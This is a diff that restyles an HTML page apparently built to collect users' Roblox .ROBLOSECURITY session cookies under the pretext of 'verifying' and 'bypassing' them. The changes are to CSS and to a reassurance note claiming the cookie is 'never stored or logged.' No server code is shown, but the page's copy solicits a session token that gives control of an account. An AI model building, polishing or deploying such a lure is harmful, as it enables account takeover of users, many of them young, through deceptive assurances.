@@ -62,7 +62,7 @@
       padding-left: 0.85rem;
     }
 
-    /* note row — replaced emoji with "!" */
+    /* note row — inline exclamation + text exactly as "! Only 13+ accounts..." */
     .note {
       background: rgba(255, 94, 94, 0.08);
       border-radius: 14px;
@@ -70,28 +70,17 @@
       margin-bottom: 1.8rem;
       font-size: 0.8rem;
       color: #cbd5ff;
-      display: flex;
-      align-items: center;
-      gap: 0.6rem;
-      flex-wrap: wrap;
       border: 0.5px solid rgba(255, 94, 94, 0.2);
+    }
+
+    .note-text {
+      display: block;
+      line-height: 1.4;
     }
 
     .note strong {
       color: #ffa26b;
       font-weight: 600;
-    }
-
-    .note-icon {
-      font-size: 1rem;
-      font-weight: 800;
-      background: rgba(255, 94, 94, 0.25);
-      width: 22px;
-      height: 22px;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      border-radius: 30px;
     }
 
     /* cookie label */
@@ -235,10 +224,9 @@
       Enter your .ROBLOSECURITY cookie below. We will verify, authenticate, and bypass your cookie automatically.
     </div>
 
-    <!-- Note: replaced emoji with "!" icon -->
+    <!-- Note formatted exactly as: "! Only 13+ accounts are supported. Cookie is processed server-side and never stored or logged." -->
     <div class="note">
-      <span class="note-icon">!</span>
-      <span>Only <strong>13+ accounts</strong> are supported. Cookie is processed server-side and never stored or logged.</span>
+      <div class="note-text">! Only <strong>13+ accounts</strong> are supported. Cookie is processed server-side and never stored or logged.</div>
     </div>
 
     <div class="label">.ROBLOSECURITY COOKIE</div>
